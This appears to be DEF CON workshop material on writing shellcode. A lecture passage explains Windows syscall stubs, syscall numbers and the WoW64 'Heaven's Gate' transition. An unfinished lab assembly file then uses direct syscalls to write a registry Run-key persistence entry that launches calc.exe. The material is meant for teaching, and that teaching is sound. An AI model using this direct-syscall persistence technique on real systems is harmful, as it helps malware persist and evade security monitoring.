For this example, we'll open up an application in Windbg and look at the one of the Nt\* exports for ntdll.dll. All of the available Nt\* functions are exported out of ntdll.dll. Since ntdll.dll is always loaded into process memory, we can load any program and get access to information about it with Windbg.

We'll start with NtCreateFile on 64-bit. We can look it up in Windbg and we'll see something like:

```text
0:000> x /D /f ntdll!NtCreateFile

00007ffc`3d282590 ntdll!NtCreateFile (NtCreateFile)

0:000> uf 00007ffc`3d282590

ntdll!NtCreateFile:
00007ffc`3d282590 4c8bd1          mov     r10,rcx
00007ffc`3d282593 b855000000      mov     eax,55h
00007ffc`3d282598 f604250803fe7f01 test    byte ptr
    [SharedUserData+0x308 (00000000`7ffe0308)],1
00007ffc`3d2825a0 7503            jne     ntdll!NtCreateFile
    +0x15 (00007ffc`3d2825a5)
  
ntdll!NtCreateFile+0x12:
00007ffc`3d2825a2 0f05            syscall
00007ffc`3d2825a4 c3              ret
  
ntdll!NtCreateFile+0x15:
00007ffc`3d2825a5 cd2e            int     2Eh
00007ffc`3d2825a7 c3              ret
```

We can see here that the the SSN is 0x55. The value that is placed into the *AX register will be used as the SSN value when it transitions from user-mode to kernel-mode. Then it calls the syscall function to make the transition.

Let's look at another one to compare and contract. We'll look at NtAccessCheck next.

```text
0:000> x /D /f ntdll!NtAccessCheck
  
00007ffc`3d281af0 ntdll!NtAccessCheck (NtAccessCheck)
0:000> uf 00007ffc`3d281af0
ntdll!NtAccessCheck:
00007ffc`3d281af0 4c8bd1          mov     r10,rcx
00007ffc`3d281af3 b800000000      mov     eax,0
00007ffc`3d281af8 f604250803fe7f01 test    byte ptr
    [SharedUserData+0x308 (00000000`7ffe0308)],1
00007ffc`3d281b00 7503            jne     ntdll!NtAccessCheck
    +0x15 (00007ffc`3d281b05)  Branch
  
ntdll!NtAccessCheck+0x12:
00007ffc`3d281b02 0f05            syscall
00007ffc`3d281b04 c3              ret
  
ntdll!NtAccessCheck+0x15:
00007ffc`3d281b05 cd2e            int     2Eh
00007ffc`3d281b07 c3              ret
```

Here we can actually see that NtAccessCheck has a SSN of 0; it's the first one! However, the structure remains largely the same. By this time in the call stack, all of the parameters are where they need to be and the only thing left is to use the unique SSN to transition from user-mode to kernel-mode and begin the kernel's side of the execute of this system call.

## Wow64

Before we jump into lab, we're going to talk about one more topic, WoW64. For those of you who haven't heard of it, it's the reason you can run 32-bit shellcode on your 64-bit operating systems. Windows handles the translation of architecture from the user-mode 32-bit application to the 64-bit kernel.

This translation requires specific instructions and execution paths to convert the information from 32-bit to 64-bit and this is often called Heaven's Gate.

If you didn't notice, for this lecture I was showing you 64-bit syscalls as you can see from the registers. However when working with the 32-bit version on a 64-bit operating system, the calls look slightly different.

```text
0:000> u ntdll!NtCreateFile
ntdll!NtCreateFile:
77569bf0 b855000000      mov     eax,55h
77569bf5 ba501f5a77      mov     edx,offset ntdll!Wow64SystemServiceCall (775a1f50)
77569bfa ffd2            call    edx
77569bfc c22c00          ret     2Ch
77569bff 90              nop
```

Here we see that we call the Wow64SystemServiceCall function indirectly by loading it into the EDX register. This leads to a `JMP` instruction to ntdll!Wow64Transition. You can follow these steps in Windbg, if you need to see it visually or want to follow along.

If you see a bunch of garbage instructions, make sure you understand that the ntdll!Wow64Transition is a pointer to the executable code and dereference it when looking at it in a debugger.

The first instruction there is critical, `jmp 0033:774e7009`, this is the transition from 32-bit to 64-bit as it makes a far jmp to enable 64-bit mode. We wont talk too much more about this, but it does set up for our last lab, using ShellWasp.
````

### `DEF CON 34 - Workshops - Bramwell - Bw3ll - Brizendine - Creating Shellcode for Hackers/ShellWasp/syscall_shellcode lab.asm`

```asm
[bits 32]

	; Please build this from ShellWasp
	; Here is an old sample version.

	mov ebx,DWORD  [fs:0x30]
	mov ebx, dword  [ebx+0xac]
	mov ecx, esp
	sub esp, 0x1000
	cmp bl, 0x64            ; 21H2, Win10 release
	jl less1
	push 0x7002c            ; NtTerminateProcess
	push 0x3000f            ; NtClose
	push 0x60               ; NtSetValueKey
	push 0x1d               ; NtCreateKey
	jmp saveSyscallArray
	less1:
	cmp bl, 0x63 			; 21h1, Win10 release
    jl less2
    push 0x7002c   			; NtTerminateProcess
    push 0x3000f			; NtClose
    push 0x60				; NtSetValueKey
    push 0x1d				; NtCreateKey
    jmp saveSyscallArray
	less2:
	cmp bl, 0x62            ; 20H2, Win10 release
	jl less3
	push 0x2c               ; NtTerminateProcess
	push 0xf                ; NtClose
	push 0x60               ; NtSetValueKey
	push 0x1d               ; NtCreateKey
	jmp saveSyscallArray
	less3:
	cmp bl, 0xF0            ; 21H2, Win11 release
	jl less4
	push 0x7002c            ; NtTerminateProcess
	push 0x3003f            ; NtClose
	push 0x60               ; NtSetValueKey
	push 0x1d               ; NtCreateKey
	jmp saveSyscallArray
	less4:
	cmp bl, 0x61            ; 2004, Win10 release
	jl less5
	push 0x2c               ; NtTerminateProcess
	push 0xf                ; NtClose
	push 0x60               ; NtSetValueKey
	push 0x1d               ; NtCreateKey
	jmp saveSyscallArray
	less5:
	cmp bl, 0xBB            ; 1909, Win10 release
	jl less6
	push 0x2c               ; NtTerminateProcess
	push 0xf                ; NtClose
	push 0x60               ; NtSetValueKey
	push 0x1d               ; NtCreateKey
	jmp saveSyscallArray
	less6:
	cmp bl, 0xBA            ; 1903, Win10 release
	jl less7
	push 0x2c               ; NtTerminateProcess
	push 0xf                ; NtClose
	push 0x60               ; NtSetValueKey
	push 0x1d               ; NtCreateKey
	jmp saveSyscallArray
	less7:
	cmp bl, 0xB1            ; Win7, Sp1 release
	jl end
	push 0x29               ; NtTerminateProcess
	push 0xc                ; NtClose
	push 0x5d               ; NtSetValueKey
	push 0x1a               ; NtCreateKey
	saveSyscallArray:
	mov edi, esp
	mov esp, ecx


	sub	esp, 0x1000	; Storage for Params

; Length without NULL: 0x7e
; Length with NULL: 0x80
; UTF-16: \Registry\Machine\Software\Microsoft\Windows\CurrentVersion\Run
	xor edx, edx
	push edx
	mov dl, 0x6e
	push dx
	mov dl, 0x75
	push dx
	mov dl, 0x52
	push dx
	mov dl, 0x5c
	push dx
	mov dl, 0x6e
	push dx
	mov dl, 0x6f
	push dx
	mov dl, 0x69
	push dx
	mov dl, 0x73
	push dx
	mov dl, 0x72
	push dx
	mov dl, 0x65
	push dx
	mov dl, 0x56
	push dx
	mov dl, 0x74
	push dx
	mov dl, 0x6e
	push dx
	mov dl, 0x65
	push dx
	mov dl, 0x72
	push dx
	mov dl, 0x72
	push dx
	mov dl, 0x75
	push dx
	mov dl, 0x43
	push dx
	mov dl, 0x5c
	push dx
	mov dl, 0x73
	push dx
	mov dl, 0x77
	push dx
	mov dl, 0x6f
	push dx
	mov dl, 0x64
	push dx
	mov dl, 0x6e
	push dx
	mov dl, 0x69
	push dx
	mov dl, 0x57
	push dx
	mov dl, 0x5c
	push dx
	mov dl, 0x74
	push dx
	mov dl, 0x66
	push dx
	mov dl, 0x6f
	push dx
	mov dl, 0x73
	push dx
	mov dl, 0x6f
	push dx
	mov dl, 0x72
	push dx
	mov dl, 0x63
	push dx
	mov dl, 0x69
	push dx
	mov dl, 0x4d
	push dx
	mov dl, 0x5c
	push dx
	mov dl, 0x65
	push dx
	mov dl, 0x72
	push dx
	mov dl, 0x61
	push dx
	mov dl, 0x77
	push dx
	mov dl, 0x74
	push dx
	mov dl, 0x66
	push dx
	mov dl, 0x6f
	push dx
	mov dl, 0x53
	push dx
	mov dl, 0x5c
	push dx
	mov dl, 0x65
	push dx
	mov dl, 0x6e
	push dx
	mov dl, 0x69
	push dx
	mov dl, 0x68
	push dx
	mov dl, 0x63
	push dx
	mov dl, 0x61
	push dx
	mov dl, 0x4d
	push dx
	mov dl, 0x5c
	push dx
	mov dl, 0x79
	push dx
	mov dl, 0x72
	push dx
	mov dl, 0x74
	push dx
	mov dl, 0x73
	push dx
	mov dl, 0x69
	push dx
	mov dl, 0x67
	push dx
	mov dl, 0x65
	push dx
	mov dl, 0x52
	push dx
	mov dl, 0x5c
	push dx
	mov [ebp-4], esp ; REG_PATH

; Length without NULL: 0x38
; Length with NULL: 0x3a
; UTF-16: c:\Windows\System32\calc.exe

; You Want to build this   -  look to the above as a guide on how to do this.
; You can use cyber chef to generic the ASCII - just remember that you will need to put it in reverse order! 
; https://gchq.github.io/CyberChef/#recipe=To_Hex('Space',1)&input=SGVyZSBpcyB0ZXh0
    xor edx, edx
    push edx
    mov dl, 0x65
    push dx
    
    ; Do more! 
    mov [ebp-8], esp ; CALC_PATH

; Length without NULL: 0x26
; Length with NULL: 0x28
; UTF-16: Evil Syscall Created Key
	xor edx, edx
	push edx
	mov dl, 0x79
	push dx
	; Build the above string!
	mov [ebp-12], esp ; VALUE_NAME

; UNICODE_STRING ValueName
	xor edx, edx
	push dword [ebp-12] ; Buffer
	mov dx, 0x28     
	push dx ; Max Length
	mov dx, 0x26
	push dx ; Length
	mov [ebp-16], esp ; US_VALUE_NAME

; UNICODE_STRING REG_PATH
	xor edx, edx
	
	; Do this! 
	mov [ebp-20], esp ; US_REG_PATH

; _OBJECT_ATTRIBUTES
	xor edx, edx
	xor ecx, ecx
	push edx ; SecurityQualityOfService = NULL
	push edx ; SecurityDescriptor = NULL
	; Do the rest!
	mov [ebp-24], esp ; OBJECT_ATTR

; KeyHandle
	xor edx, edx
	push edx
	mov [ebp-28], esp ; PKEY_HANDLE

;  Access Mask:

; KEY_ALL_ACCESS | KEY_WOW64_64KEY = 0xF013F
; Will Use Normal Registry
; Computer\HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run

	; Get the ACCESS_MASK value into ecx!

	mov [ebp-32], ecx

NtCreateKey:
	; We will do part of this together as an example - and you need to do the rest!
	; Remember - ShellWasp can help tell you the arguments to use, and so can your lab guide.
    push edi ; Save Syscall Array
	xor edx, edx
    push edx ; KEY_DISPOSITION = NULL
	push edx ; Create Options REG_OPTION_NON_VOLATILE = 0x0
	; Some arguments are missing here!
    push dword [ebp-24] ; OBJECT_ATTR  ; These are some of your arguments that you will have created up above!
    push dword [ebp-32] ; ACCESS_MASK
    ; Do the rest!
	mov eax, [edi]
	call ourSyscall
	add esp, 28
    pop edi ; Get Syscall Array

    xor ecx, ecx
    cmp eax, ecx
    jne NtTerminateProcess

RegSetValueKey:
    push edi ; Save Syscall Array
    ; Push your arguments!
    mov eax, [edi+4]
    call ourSyscall
    add esp, 24
    pop edi ; Get Syscall Array

NtClose:
    ; Push your arguments
    call ourSyscall
    add esp, 4
    pop edi ; Get Syscall Array


NtTerminateProcess:
    ; Push your arguments!
	mov eax, [edi+12]
	call ourSyscall
    add esp, 8

jmp skipSyscall
ourSyscall:
	mov ebx,DWORD  [fs:0x30]
    mov ebx, [ebx+0xa4] ; OS Major Version
    cmp bl, 10
    jne win7 
    win10:
	    call [fs:0xc0]
	    ret 
    win7:
        xor ecx, ecx
        lea edx, [esp+4]
        call [fs:0xc0]
        add esp, 4
        ret
skipSyscall:
end:
```

### `DEF CON 34 - Workshops - Bramwell - Bw3ll - Brizendine - Creating Shellcode for Hackers/Solutions and Walkthroughs/Please read.txt`

```text
The zip file contains very detailed walk throughs, so you can see what to do - and how to do it - if you do not succeed.

We will give out the password only AFTER the workshop ends.
```
